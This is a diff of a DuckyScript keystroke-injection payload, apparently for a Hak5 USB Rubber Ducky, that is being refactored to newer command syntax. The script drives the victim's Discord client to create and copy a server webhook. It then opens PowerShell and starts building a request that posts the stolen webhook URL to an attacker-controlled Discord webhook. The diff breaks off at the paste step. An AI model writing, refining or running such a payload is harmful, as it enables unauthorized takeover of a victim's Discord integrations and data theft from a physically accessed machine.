@@ -13,131 +13,61 @@ REM Requirements:
 REM     - Internet connection
 REM     - Discord Installed
 
-
 REM You must define the Discord server name i.e. Hak5
-DEFINE SERVER_NAME example
+DEFINE #SERVER_NAME example
 
 REM You must define your Discord webhook if you want to use this method for the exfiltration
-DEFINE DISCORD_WEBHOOK example
+DEFINE #DISCORD_WEBHOOK example
+
+DEFAULT_DELAY 500
 
 REM Open Discord app
 GUI
-DELAY 1000
-STRING Discord
-ENTER
+STRINGLN Discord
 
 REM It depends
 DELAY 6000
 
 REM Search by Discord keyboard shortcut and open it
 CTRL k
-DELAY 500
 STRING *
-STRING SERVER_NAME
-ENTER
-DELAY 500
+STRINGLN #SERVER_NAME
 
 REM Go to first channel and open the settings
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
+REPEAT 11 TAB
 ENTER
-DELAY 500
 
 REM Open Integrations section
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-DOWN_ARROW
-DELAY 500
-DOWN_ARROW
-DELAY 500
-DOWN_ARROW
-DELAY 500
+REPEAT 6 TAB
+REPEAT 3 DOWNARROW
 ENTER
-DELAY 500
 
 REM Webhooks settings
-TAB
-DELAY 500
-TAB
-DELAY 500
+REPEAT 2 TAB
 ENTER
 
 REM Create Webhook
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
+REPEAT 3 TAB
 ENTER
-DELAY 500
 
 REM Select first Webhook
 TAB
-DELAY 500
 ENTER
-DELAY 500
 
 REM Copy Webhook
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
+REPEAT 5 TAB
 SPACE
-DELAY 500
 
 REM Close Discord
 ALT F4
 
 REM Open a PowerShell
-DELAY 500
 GUI r
-DELAY 500
-STRING powershell
-DELAY 500
-ENTER
+STRINGLN powershell
 DELAY 2000
 
 REM Exfiltration using Discord Webhook
-STRING $WebhookUrl = "
-STRING DISCORD_WEBHOOK
-STRINGLN "
+STRINGLN $WebhookUrl = "#DISCORD_WEBHOOK"
 
 STRING $Payload = @{content = "
 CTRL v
